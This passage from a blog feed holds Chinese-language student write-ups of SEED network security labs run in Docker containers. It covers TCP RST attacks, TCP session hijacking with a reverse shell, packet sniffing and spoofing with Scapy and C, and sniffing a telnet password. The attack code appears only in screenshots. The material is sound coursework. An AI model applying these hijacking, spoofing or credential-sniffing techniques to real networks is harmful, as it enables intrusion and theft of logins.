src="https://gitee.com/r0otsu/images/raw/master/image-20241220074130463.png" alt="image-20241220074130463"></p></li></ol><p><strong>telnet连接失败！</strong></p><hr><h5 id="Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="Task 1.3: Enable the SYN Cookie Countermeasure"></a>Task 1.3: Enable the SYN Cookie Countermeasure</h5><ol><li><p>先清空一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220074406773.png" alt="image-20241220074406773"></p></li><li><p>在victim主机启动syncookies</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220074440283.png" alt="image-20241220074440283"></p></li><li><p>继续在attacker主机执行程序进行泛洪攻击，victim主机出现大量tcp连接</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220074619741.png" alt="image-20241220074619741"></p></li><li><p>但此时user1主机却可以telnet连接victim主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220074850165.png" alt="image-20241220074850165"></p></li></ol><p><strong>telnet连接成功！</strong></p><hr><h4 id="Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="Task 2: TCP RST Attacks on telnet Connections"></a>Task 2: TCP RST Attacks on telnet Connections</h4><ol><li><p>先得到虚拟网卡的名称</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220075228818.png" alt="image-20241220075228818"></p></li><li><p>创建<code>tcprst.py</code>，用于执行TCP RST攻击</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220075322756.png" alt="image-20241220075322756"></p></li><li><p>复制到attacker主机中去</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220075515545.png" alt="image-20241220075515545"></p></li><li><p>attacker主机中执行程序</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220075622625.png" alt="image-20241220075622625"></p></li><li><p>user1尝试telnet连接attacker主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220075724470.png" alt="image-20241220075724470"></p></li></ol><p><strong>连接被切断了，无法连接！</strong></p><hr><h4 id="Task-3-TCP-Session-Hijacking"><a href="#Task-3-TCP-Session-Hijacking" class="headerlink" title="Task 3: TCP Session Hijacking"></a>Task 3: TCP Session Hijacking</h4><ol><li><p>创建<code>tcphijacking.py</code>，用于在客户机进行telnet连接时，执行tcp会话劫持，并向主机中写入一个文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220080135750.png" alt="image-20241220080135750"></p></li><li><p>复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220080707005.png" alt="image-20241220080707005"></p></li><li><p>user1先进行telnet连接</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220080807298.png" alt="image-20241220080807298"></p></li><li><p>attacker主机执行<code>tcphijacking.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220080921445.png" alt="image-20241220080921445"></p></li><li><p>attacker主机中返回了劫持的信息</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081156321.png" alt="image-20241220081156321"></p><p>此时user1主机卡住不动了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081134087.png" alt="image-20241220081134087"></p></li><li><p>victim主机中确实被写入了一个文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081335920.png" alt="image-20241220081335920"></p></li></ol><p><strong>TCP会话劫持成功！</strong></p><hr><h4 id="Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>Task 4: Creating Reverse Shell using TCP Session Hijacking</h4><ol><li><p>创建<code>reverseshell.py</code>文件，用于执行TCP会话劫持，并实现反弹shell</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081630998.png" alt="image-20241220081630998"></p></li><li><p>将<code>reverseshell.py</code>文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081804422.png" alt="image-20241220081804422"></p></li><li><p>再新开一个终端，用于在attacker主机中进行监听</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220081928851.png" alt="image-20241220081928851"></p></li><li><p>user1主机telnet连接victim主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220082133994.png" alt="image-20241220082133994"></p></li><li><p>attacker主机执行<code>reverseshell.py</code>文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220082246060.png" alt="image-20241220082246060"></p></li><li><p>attacker主机的监听有所返回</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220082750557.png" alt="image-20241220082750557"></p><p><strong>反弹shell成功了！</strong></p></li><li><p>测试一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220082857240.png" alt="image-20241220082857240"></p></li></ol><p><strong>劫持TCP会话，并反弹shell成功！</strong></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 9</title>
    <link href="/2024/12/25/lab9/"/>
    <url>/2024/12/25/lab9/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-9-嗅探与欺骗实验"><a href="#Lab-9-嗅探与欺骗实验" class="headerlink" title="Lab 9-嗅探与欺骗实验"></a>Lab 9-嗅探与欺骗实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是如何在软件中实现的。</p><p>本实验的目标是让学生掌握大多数嗅探和欺骗工具的基本技术。学生们将使用一些简单的嗅探和欺骗程序，阅读它们的源代码，修改它们，并最终对这些程序的技术方面有深入的了解。在本实验结束时，学生应该能够编写自己的嗅探和欺骗程序。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ol><li><p>加载<code>handsonsecurity/seed-ubuntu:large</code>的镜像：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219074635566.png" alt="image-20241219074635566"></p><p>查看一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219075000039.png" alt="image-20241219075000039"></p></li><li><p>使用以下命令创建并开启docker作为服务器；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219074940844.png" alt="image-20241219074940844"></p></li></ol><hr><h4 id="Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 1: Using Scapy to Sniff and Spoof Packets"></a>Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</h4><h5 id="Task-1-1-Sniffing-Packets"><a href="#Task-1-1-Sniffing-Packets" class="headerlink" title="Task 1.1: Sniffing Packets"></a>Task 1.1: Sniffing Packets</h5><h6 id="Task-1-1A"><a href="#Task-1-1A" class="headerlink" title="Task 1.1A."></a>Task 1.1A.</h6><ol><li><p>打开另一终端，创建<code>sniffer.py</code>文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219075709486.png" alt="image-20241219075709486"></p></li><li><p>安装<code>scapy</code>，这里看到已经安装了；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219075825582.png" alt="image-20241219075825582"></p></li><li><p>先把<code>sniffer.py</code>的权限设置一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219080645901.png" alt="image-20241219080645901"></p></li><li><p>非root下运行<code>sniffer.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219080716578.png" alt="image-20241219080716578"></p></li><li><p>root下运行<code>sniffer.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219080739152.png" alt="image-20241219080739152"></p><p><strong>可以看到这个终端开始嗅探了</strong></p></li><li><p>另一终端 ping 10.0.2.4</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219080824898.png" alt="image-20241219080824898"></p></li><li><p>发现有返回，且都是ICMP协议的包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219080944038.png" alt="image-20241219080944038"></p><p><strong>说明返回了嗅探的结果</strong></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h6 id="Task-1-1B"><a href="#Task-1-1B" class="headerlink" title="Task 1.1B."></a>Task 1.1B.</h6><ol><li><p>创建<code>sniffer-1.py</code>，使用summary()函数返回pkt</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219081120778.png" alt="image-20241219081120778"></p></li><li><p>运行<code>sniffer-1.py</code>开始嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219082135108.png" alt="image-20241219082135108"></p></li><li><p>另一终端ping 10.2.0.4</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219081403679.png" alt="image-20241219081403679"></p></li><li><p>嗅探结果返回如下，只捕获了ICMP包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219081511390.png" alt="image-20241219081511390"></p></li></ol><p><strong>嗅探成功！</strong></p><hr><ol><li><p>创建<code>datapak.py</code>，用于从10.0.2.2向10.0.2.1的端口23发送包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219122610566.png" alt="image-20241219122610566"></p><p>修改<code>sniffer-1.py</code>，将ip.src, tcp.dport加进过滤器中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219122926578.png" alt="image-20241219122926578"></p></li><li><p>先开<code>sniffer-1.py</code>进行嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219082735010.png" alt="image-20241219082735010"></p></li><li><p>运行<code>datapak.py</code>发包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219122805540.png" alt="image-20241219122805540"></p></li><li><p>得到嗅探结果</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123025517.png" alt="image-20241219123025517"></p></li></ol><p><strong>嗅探成功！</strong></p><hr><ol><li><p>查看一下自己本机的ip和子网掩码：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123202527.png" alt="image-20241219123202527"></p><p>（除了这些ip不能设置外，其他的都可以）</p></li><li><p>修改<code>datapak.py</code>，改成除了自己所连子网下的ip，比如题目举例的<code>128.230.0.0/16</code>下的ip<code>128.230.0.1</code>，端口仍然设置为23</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123348597.png" alt="image-20241219123348597"></p></li><li><p>修改<code>sniffer-1.py</code>，将过滤器修改为<code>128.230.0.0/16</code>下的子网</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123637783.png" alt="image-20241219123637783"></p></li><li><p>先开启嗅探，运行<code>sniffer-1.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123441682.png" alt="image-20241219123441682"></p></li><li><p>运行<code>datapak.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123507270.png" alt="image-20241219123507270"></p></li><li><p>得到嗅探结果：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219123738056.png" alt="image-20241219123738056"></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h5 id="Task-1-2-Spoofing-ICMP-Packets"><a href="#Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="Task 1.2: Spoofing ICMP Packets"></a>Task 1.2: Spoofing ICMP Packets</h5><ol><li><p>wireshark已经安装好了，输入<code>wireshark</code>直接启动</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219124815451.png" alt="image-20241219124815451"></p></li><li><p>因为scrapy可以将发出的包的任意字段进行隐藏，所以修改<code>datapak.py</code>中的ip.src，修改为<code>233.233.233.233</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219125118048.png" alt="image-20241219125118048"></p></li><li><p>在wireshark中选择any，监听所有网卡</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219125240203.png" alt="image-20241219125240203"></p></li><li><p>运行<code>datapak.py</code>，发送隐藏了ip的数据包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219125401292.png" alt="image-20241219125401292"></p></li><li><p>wireshark中抓到包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219125553853.png" alt="image-20241219125553853"></p><p>可以看到src.ip, dst.ip, tcp.port都是设定的值，src.ip成功隐藏为<code>233.233.233.233</code></p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-1-3-Traceroute"><a href="#Task-1-3-Traceroute" class="headerlink" title="Task 1.3: Traceroute"></a>Task 1.3: Traceroute</h5><ol><li><p>创建<code>trace.py</code>，探究从本机到’baidu.com’需要经过哪些路由</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219130022208.png" alt="image-20241219130022208"></p></li><li><p>运行得到结果</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219130142127.png" alt="image-20241219130142127"></p><p>说明’baidu.com’的ip是<code>110.242.68.66</code>，只需要一跳就到了。</p></li></ol><hr><h5 id="Task-1-4-Sniffing-and-then-Spoofing"><a href="#Task-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="Task 1.4: Sniffing and-then Spoofing"></a>Task 1.4: Sniffing and-then Spoofing</h5><ol><li><p>创建<code>sniffer-task14.py</code>，使得嗅探器不仅要抓取当前子网内的所有ICMP数据包，还要针对每一个数据包都去构造<strong>伪响应</strong></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219132100366.png" alt="image-20241219132100366"></p></li><li><p>运行<code>sniffer-task14.py</code>进行嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219131841218.png" alt="image-20241219131841218"></p></li><li><p>另一终端ping 1.2.3.4，这是互联网中并不存在的ip</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219132346913.png" alt="image-20241219132346913"></p><p>发现不仅嗅探器里显示发送数据包，而且确实能ping通，能收到伪造的回应数据包</p></li><li><p>另一终端ping 10.9.0.99，这是子网中不存在的ip</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219132655889.png" alt="image-20241219132655889"></p><p>发现显示不可达，嗅探器并不返回。</p><p>这是因为在同一子网内，数据包不会经过主机提供的NAT映射服务以转发到外网，而是会顺着局域网内路由直接发送到对方主机，而<code>10.9.0.99</code>又并不存在，因此显示不可达</p></li><li><p>另一终端ping 10.9.0.99，这是互联网中存在的ip</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219133027556.png" alt="image-20241219133027556"></p><p>由于真实的服务器也会返回一个报文，所以容器中会接收到两份返回报文，显示冗余了！</p></li></ol><hr><h4 id="Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h4><h5 id="Task-2-1-Writing-Packet-Sniffing-Program"><a href="#Task-2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="Task 2.1: Writing Packet Sniffing Program"></a>Task 2.1: Writing Packet Sniffing Program</h5><ol><li><p>创建<code>sniff.c</code>文件，使用c++进行嗅探，并打印出数据包的src.ip和dst.ip</p><p><font color='orange'>*将main函数中的网卡名称改成自己本地ubuntu的</font><font color='red'>（箭头所指）</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220011326880.png" alt="image-20241220011326880"></p></li><li><p>编译时链接pcap库，得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220014646147.png" alt="image-20241220014646147"></p></li><li><p>查看容器，将<code>sniff</code>复制到seed-attacker的tmp文件夹下，并进入到攻击容器中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220014951875.png" alt="image-20241220014951875"></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220015046416.png" alt="image-20241220015046416"></p></li><li><p>进入hostA主机，并尝试ping baidu.com</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220015519007.png" alt="image-20241220015519007"></p></li><li><p>attacker容器中嗅探到hostA发出的数据包，嗅探器中返回数据包的src.ip和dst.ip</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220015602245.png" alt="image-20241220015602245"></p></li></ol><p><strong>嗅探成功！</strong></p><hr><h6 id="Task-2-1A-Understanding-How-a-Sniffer-Works"><a href="#Task-2-1A-Understanding-How-a-Sniffer-Works" class="headerlink" title="Task 2.1A: Understanding How a Sniffer Works"></a>Task 2.1A: Understanding How a Sniffer Works</h6><p>根据实验手册回答三个问题</p><p><strong>Question 1.</strong> Please use your own words to describe the sequence of the library calls that are essential for sniffer programs. This is meant to be a summary, not detailed explanation like the one in the tutorial or book.</p><p><strong>答：</strong>使用pcap库编写嗅探程序时：</p><ul><li>首先<code>pcap_open_live()</code>打开指定网络接口的实时捕获会话；</li><li>然后<code>pcap_compile()</code>将过滤表达式编译成BPF；</li><li><code>pcap_setfilter()</code>应用之前编译好的过滤器，匹配过滤条件的数据包才会被捕获；</li><li><code>pcap_loop()</code>函数会循环捕获数据包，将每个捕获的数据包传递给回调函数；</li><li>最后调用<code>pcap_close()</code>函数关闭pcap句柄，结束数据包捕获。</li></ul><hr><p><strong>Question 2.</strong> Why do you need the root privilege to run a sniffer program? Where does the program fail if it is executed without the root privilege?</p><p><strong>答：需要root权限。</strong>因为嗅探器直接访问网络接口，捕获经过的所有数据包，这个行为需要root权限才能执行。</p><p>调用<code>pcap_open_live()</code>函数时，若为非root权限，函数会返回NULL，errbuf中填充错误信息，程序将无法继续执行。</p><hr><p><strong>Question 3.</strong> Please turn on and turn off the promiscuous mode in your sniffer program. The value 1 of the third parameter in pcap open live() turns on the promiscuous mode (use 0 to turn it off). Can you demonstrate the difference when this mode is on and off? Please describe how you can demonstrate this. You can use the following command to check whether an interface’s promiscuous mode is on or off (look at the promiscuity’s value).</p><p><strong>答：</strong>使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。</p><p><strong>关闭混杂模式</strong></p><ol><li><p>修改<code>pcap open live()</code>函数的第三个参数为<strong>0</strong>，关闭混杂模式</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220013900586.png" alt="image-20241220013900586"></p></li><li><p>可以看到默认的混杂模式是关闭的</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220014220662.png" alt="image-20241220014220662"></p></li><li><p>编译时链接pcap库，重新得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220014646147.png" alt="image-20241220014646147"></p></li><li><p>查看容器，将<code>sniff</code>复制到seed-attacker的tmp文件夹下，并进入到攻击容器中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220020223531.png" alt="image-20241220020223531"></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220020250017.png" alt="image-20241220020250017"></p></li><li><p>进入hostA主机，并尝试ping主机B ping 10.9.0.6</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220015519007.png" alt="image-20241220015519007"></p></li><li><p>attacker容器中不能嗅探到hostA发出的数据包，嗅探器中不返回</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220020510790.png" alt="image-20241220020510790"></p></li></ol><p><strong>嗅探失败！</strong></p><hr><p><strong>开启混杂模式</strong></p><ol><li><p>修改<code>pcap open live()</code>函数的第三个参数为<strong>1</strong>，使用混杂模式</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220021324977.png" alt="image-20241220021324977"></p></li><li><p>使用命令开启容器的混杂模式</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220021402764.png" alt="image-20241220021402764"></p></li><li><p>编译时链接pcap库，重新得到可执行的嗅探器<code>sniff</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220014646147.png" alt="image-20241220014646147"></p></li><li><p>将<code>sniff</code>复制到seed-attacker的tmp文件夹下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220021536755.png" alt="image-20241220021536755"></p></li><li><p>attacker主机等待嗅探</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220021601355.png" alt="image-20241220021601355"></p></li><li><p>进入hostA主机，并尝试ping主机B ping 10.9.0.6</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220015519007.png" alt="image-20241220015519007"></p></li><li><p>attacker容器中仍然不能嗅探到hostA ping hostB发出的数据包，ping baidu.com 返回数据包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220020510790.png" alt="image-20241220020510790"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220021819736.png" alt="image-20241220021819736"></p></li></ol><hr><h6 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters."></a>Task 2.1B: Writing Filters.</h6><ol><li><p>修改过滤器，只获得从百度-&gt;本地的数据包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220022810574.png" alt="image-20241220022810574"></p></li><li><p>重复上述过程，发现attacker中的嗅探器只显示了返回的数据包，说明过滤起效了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220023023220.png" alt="image-20241220023023220"></p></li></ol><hr><ol><li><p>修改过滤器，只捕捉目的端口在10到100之间的TCP包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220023155598.png" alt="image-20241220023155598"></p></li><li><p>ping baidu.com 不返回了，说明过滤器起效了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220023448396.png" alt="image-20241220023448396"></p></li></ol><hr><h6 id="Task-2-1C-Sniffing-Passwords"><a href="#Task-2-1C-Sniffing-Passwords" class="headerlink" title="Task 2.1C: Sniffing Passwords."></a>Task 2.1C: Sniffing Passwords.</h6><ol><li><p>创建<code>sniff-2.c</code>文件，尝试嗅探telnet密码，将过滤条件改为tcp，并且将嗅探的网卡改为虚拟网卡</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220031145736.png" alt="image-20241220031145736"></p></li><li><p>将编译后的<code>sniff-2</code>文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220024221139.png" alt="image-20241220024221139"></p></li><li><p>在hostA中尝试使用telnet连接10.9.0.1，可以看到attacker嗅探器中返回有数据</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220031339003.png" alt="image-20241220031339003"></p></li><li><p>hostA继续输入，直到输入password</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220031509275.png" alt="image-20241220031509275"></p><p>attacker嗅探器中仍然可以返回，拿到密码了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220031555077.png" alt="image-20241220031555077"></p><p>可以看到登录的用户为seed，嗅探到的密码为dees</p></li></ol><p><strong>嗅探成功！</strong></p><hr><h5 id="Task-2-2-Spoofing"><a href="#Task-2-2-Spoofing" class="headerlink" title="Task 2.2: Spoofing"></a>Task 2.2: Spoofing</h5><h6 id="Task-2-2A-Write-a-spoofing-program"><a href="#Task-2-2A-Write-a-spoofing-program" class="headerlink" title="Task 2.2A: Write a spoofing program."></a>Task 2.2A: Write a spoofing program.</h6><ol><li><p>创建<code>myheader.h</code>，完整见源代码</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220032119822.png" alt="image-20241220032119822"></p></li><li><p>创建<code>checksum.c</code>，完整见源代码</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220032217230.png" alt="image-20241220032217230"></p></li><li><p>创建<code>spoof.c</code>，构造欺骗的包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220032329096.png" alt="image-20241220032329096"></p></li><li><p>创建<code>task22A.c</code>，用于发送欺骗的数据包，完整见源代码</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220032557198.png" alt="image-20241220032557198"></p></li><li><p>编译<code>task22A.c</code>和<code>spoof.c</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220032702607.png" alt="image-20241220032702607"></p></li><li><p>打开wireshark进行抓包，运行<code>task22A</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220033012394.png" alt="image-20241220033012394"></p><p>可以看到伪造的UDP包，其中有虚假的ip等</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h6 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request."></a>Task 2.2B: Spoof an ICMP Echo Request.</h6><ol><li><p>创建<code>task22B.c</code>文件，用于伪造ICMP的响应包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220033333857.png" alt="image-20241220033333857"></p></li><li><p>编译得到<code>task22B</code>的可执行文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220033456072.png" alt="image-20241220033456072"></p></li><li><p>打开wireshark进行监听，运行task22B，得到伪造的ICMP响应包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220033644524.png" alt="image-20241220033644524"></p><p>得到从8.8.8.8的响应包，说明伪造成功！</p></li></ol><p><strong>伪造成功！</strong></p><hr><p>回答实验手册中的问题</p><p><strong>Question 4.</strong> Can you set the IP packet length field to an arbitrary value, regardless of how big the actual packet is?</p><p><strong>答：不可以。</strong>IP数据包的length field为数据包的总长度。如果length field小于实际长度，会导致数据丢失；length field大于实际长度，会造成接收方处理错误。所以必须确保length field准确反映数据包的实际大小。</p><p><strong>Question 5.</strong> Using the raw socket programming, do you have to calculate the checksum for the IP header?</p><p><strong>答：在使用原始套接字发送IP数据包时，需要计算IP头部的checksum。</strong>因为操作系统不会计算原始套接字的数据包校验和，需要自己手动实现checksum的计算，用于检测header在传输过程中是否出现错误，保证数据完整性。</p><p><strong>Question 6.</strong> Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</p><p><strong>答：需要root权限。</strong>因为原始套接字允许直接访问较低层次的协议，可能会被用于发送恶意数据包或进行网络攻击，所以操作系统限制只有root权限才能创建与使用原始套接字。</p><p>当调用<code>socket()</code>函数并指定<code>SOCK_RAW</code>时，如果没有root权限，系统会返回一个错误<code>EACCES</code>，则程序无法继续对数据包进行发送或接收。</p><p>如下图：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220034842021.png" alt="image-20241220034842021"></p><hr><h5 id="Task-2-3-Sniff-and-then-Spoof"><a href="#Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="Task 2.3: Sniff and then Spoof"></a>Task 2.3: Sniff and then Spoof</h5><ol><li><p>创建<code>task23.c</code>，用于嗅探局域网内发送的ICMP包，并伪造响应，使得目标主机认为该局域网内存在实际不存在的主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220035154144.png" alt="image-20241220035154144"></p></li><li><p>编译得到<code>task23</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220040229190.png" alt="image-20241220040229190"></p></li><li><p>运行<code>task23</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220040406730.png" alt="image-20241220040406730"></p></li><li><p>使用hostA ping一个明显不存在的主机，比如1.1.1.1，但是有返回的ICMP响应包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220040517856.png" alt="image-20241220040517856"></p><p>可以看到hostA中得到了响应的ICMP包，attacker也嗅探到了hostA</p></li></ol><p><strong>伪造成功！</strong></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 8</title>
    <link href="/2024/12/25/lab8/"/>
    <url>/2024/12/25/lab8/</url>
    
